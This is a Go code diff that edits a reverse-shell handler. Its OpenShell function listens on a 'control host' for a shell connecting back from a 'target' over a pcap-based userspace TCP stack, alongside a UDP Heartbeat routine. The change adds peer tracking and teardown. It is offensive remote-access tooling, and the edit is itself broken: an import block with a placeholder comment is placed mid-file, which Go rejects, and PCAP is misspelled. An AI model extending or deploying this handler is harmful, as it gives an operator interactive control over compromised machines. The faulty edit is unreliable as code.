@@ -109,6 +109,11 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 	}
 }
 
+import (
+	// ... your other imports ...
+	"github.com/MeHungr/pcapnet" // Ensure this is imported directly
+)
+
 // OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
 	// Obtains the source ip and picks a random port for the reverse shell
@@ -120,7 +125,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}
 
 	// ========= PCAP TCP STACK ==========
-	// Derive our session context from the global signal context
 	signalCtx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
 	defer stop()
 
@@ -135,7 +139,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 		return fmt.Errorf("invalid \"-subnet:\" %w", err)
 	}
 
-	// Valid host gateway inside the subnet pool range
 	virtualIP, err := netip.ParseAddr("172.16.0.1")
 	if err != nil {
 		return err
@@ -151,6 +154,7 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
 	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
 
+	// Change this from net.Listener to the concrete pcapnet type to unlock advanced peer methods
 	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
@@ -165,13 +169,15 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 
 	type connResult struct {
 		conn net.Conn
+		peer pcapnet.Peer // Track the pcapnet peer metadata
 		err  error
 	}
 	ch := make(chan connResult, 1)
 
 	go func() {
-		c, e := listener.Accept()
-		ch <- connResult{conn: c, err: e}
+		// Use AcceptWithPeer to track the exact peer connection ID and allocation
+		c, peer, e := listener.AcceptWithPeer()
+		ch <- connResult{conn: c, peer: peer, err: e}
 	}()
 
 	go func() {
@@ -215,32 +221,38 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}
 	defer restoreTerminal()
 
-	// Monitor context cancellation to force-close connections and break io.Copy loops
+	// Track the explicit I/O done signal
+	ioDone := make(chan struct{})
+
+	// Context for tracking explicit background closure
 	go func() {
 		<-sessionCtx.Done()
 		_ = conn.Close()
 	}()
 
-	// Channel to wait for the synchronous completion of the I/O pumps
-	ioDone := make(chan struct{})
-
 	// Remote → stdout pump
 	go func() {
 		_, _ = io.Copy(os.Stdout, conn)
-		// Immediately drop out of raw terminal mode so trailing newlines print normally
 		restoreTerminal()
 		fmt.Print("\r\n[-] Target disconnected.\r\n")
-		cancelSession() // Signal the other goroutines to wind down
+		
+		// CRITICAL: Explicitly retire the allocation and wait for PCAT/TCP stack cleanup
+		// This forces the virtual gVisor environment to fully tear down and unblock
+		disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 3*time.Second)
+		defer cancelDisconnect()
+		_ = listener.DisconnectPeer(disconnectCtx, res.peer)
+
+		cancelSession() // Unwind the main session context
 	}()
 
 	// Stdin → remote pump
 	go func() {
 		_, _ = io.Copy(conn, os.Stdin)
-		cancelSession() // Signal session teardown if local stdin hits EOF
+		cancelSession()
 		close(ioDone)
 	}()
 
-	// Wait for either Ctrl+C (sessionCtx) or the connection to naturally finish
+	// Wait for cleanup completion or manual cancellation
 	select {
 	case <-sessionCtx.Done():
 	case <-ioDone:
